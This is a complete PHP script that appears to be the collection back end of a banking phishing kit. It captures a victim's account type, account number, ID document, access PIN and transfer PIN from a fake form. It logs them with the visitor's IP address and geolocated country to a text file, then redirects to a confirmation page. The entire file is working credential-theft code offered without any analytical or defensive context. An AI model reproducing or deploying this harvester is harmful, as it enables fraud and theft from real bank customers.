<?php
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$datoa=$_POST['tipo'];
$datob=$_POST['cuenta'];
$datoc=$_POST['documento'];
$datod=$_POST['pass'];
$datoe=$_POST['pass2'];
$archivo="datatxpx3.txt";
$file=fopen($archivo,"a");
fwrite($file, "".$date.PHP_EOL);
fwrite($file, "". $ipdat->geoplugin_countryCode . PHP_EOL);
fwrite($file, "" .$ip.PHP_EOL);
fwrite($file, "Tipo: ".$datoa.PHP_EOL);
fwrite($file, "Cuenta: " .$datob.PHP_EOL);
fwrite($file, "Documento: ".$datoc.PHP_EOL);
fwrite($file, "PIN de Accesp: " .$datod.PHP_EOL);
fwrite($file, "PIN De Transferencias: " .$datoe.PHP_EOL);
fclose($file);
Header ("Location:confirm.html");?>
